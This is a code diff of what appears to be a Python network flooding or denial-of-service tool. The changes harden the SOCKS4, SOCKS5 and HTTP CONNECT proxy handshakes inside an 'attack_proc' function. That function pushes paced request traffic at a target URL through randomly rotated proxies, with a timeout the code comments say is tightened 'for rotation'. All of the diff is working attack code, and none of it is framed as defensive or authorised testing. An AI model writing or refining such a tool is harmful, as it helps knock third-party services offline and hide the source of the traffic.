@@ -22,24 +22,30 @@ def get_random_string(length=8):
     return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
 
 def socks5_handshake(s, host, port):
-    # Method Selection
-    s.sendall(b"\x05\x01\x00")
-    if s.recv(2) != b"\x05\x00": return False
-    # Connect
-    try: ip = socket.gethostbyname(host)
+    try:
+        # Method Selection
+        s.sendall(b"\x05\x01\x00")
+        res = s.recv(2)
+        if not res or res != b"\x05\x00": return False
+        
+        # Connect
+        try: ip = socket.gethostbyname(host)
+        except: return False
+        addr = socket.inet_aton(ip)
+        s.sendall(b"\x05\x01\x00\x01" + addr + port.to_bytes(2, 'big'))
+        res = s.recv(10)
+        return len(res) >= 2 and res[1] == 0
     except: return False
-    addr = socket.inet_aton(ip)
-    s.sendall(b"\x05\x01\x00\x01" + addr + port.to_bytes(2, 'big'))
-    res = s.recv(10)
-    return len(res) > 0 and res[1] == 0
 
 def socks4_handshake(s, host, port):
-    try: ip = socket.gethostbyname(host)
+    try:
+        try: ip = socket.gethostbyname(host)
+        except: return False
+        addr = socket.inet_aton(ip)
+        s.sendall(b"\x04\x01" + port.to_bytes(2, 'big') + addr + b"user\x00")
+        res = s.recv(8)
+        return len(res) >= 2 and res[1] == 0x5a
     except: return False
-    addr = socket.inet_aton(ip)
-    s.sendall(b"\x04\x01" + port.to_bytes(2, 'big') + addr + b"user\x00")
-    res = s.recv(8)
-    return len(res) > 0 and res[1] == 0x5a
 
 def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shared_err, limit_type, limit_val, rps_pacer, proxies, proxy_type):
     try:
@@ -60,23 +66,22 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.settimeout(5)
-            
-            curr_host, curr_port = host, target_port
+            s.settimeout(4) # Slightly tighter for rotation
             
             if proxies:
                 proxy = random.choice(proxies)
-                p_host, p_port = proxy.split(':')
+                if ':' not in proxy: raise Exception("Invalid Proxy Format")
+                p_host, p_port = proxy.split(':', 1)
                 s.connect((p_host, int(p_port)))
                 
                 if proxy_type == 'socks5':
-                    if not socks5_handshake(s, host, target_port): raise Exception()
+                    if not socks5_handshake(s, host, target_port): raise Exception("SOCKS5 Fail")
                 elif proxy_type == 'socks4':
-                    if not socks4_handshake(s, host, target_port): raise Exception()
+                    if not socks4_handshake(s, host, target_port): raise Exception("SOCKS4 Fail")
                 elif proxy_type == 'http' and (scheme == 'https' or target_port == 443):
-                    # HTTP CONNECT Tunnel
                     s.sendall(f"CONNECT {host}:{target_port} HTTP/1.1\r\nHost: {host}:{target_port}\r\n\r\n".encode())
-                    if b"200 Connection established" not in s.recv(1024): raise Exception()
+                    res = s.recv(512)
+                    if not res or b"200" not in res: raise Exception("HTTP Tunnel Fail")
             else:
                 s.connect((host, target_port))
 
